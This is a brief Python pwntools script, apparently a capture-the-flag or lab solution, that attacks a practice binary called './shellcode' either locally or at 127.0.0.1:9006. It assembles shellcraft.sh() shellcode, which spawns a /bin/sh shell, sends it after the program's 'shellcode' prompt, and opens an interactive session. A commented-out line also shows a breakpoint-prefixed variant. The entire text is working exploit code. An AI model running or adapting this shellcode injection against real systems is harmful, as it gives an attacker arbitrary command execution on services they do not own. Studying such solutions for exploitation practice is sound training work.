#!/usr/bin/python3
from pwn import *
PATH = './shellcode'
ADDR = '127.0.0.1'
PORT = 9006
elf = context.binary = ELF(PATH)
context.log_level = 'debug'
gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(ADDR,PORT)
    elif args.GDBWIN:
        context.terminal = ['wt.exe','wsl.exe','script', '-q', 'gdb_sess', '-c']
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
io = start()
######################
#payload = b'\xCC' + asm(shellcraft.sh())
payload = shellcraft.sh()
io.sendlineafter(b'shellcode',asm(payload))
io.interactive()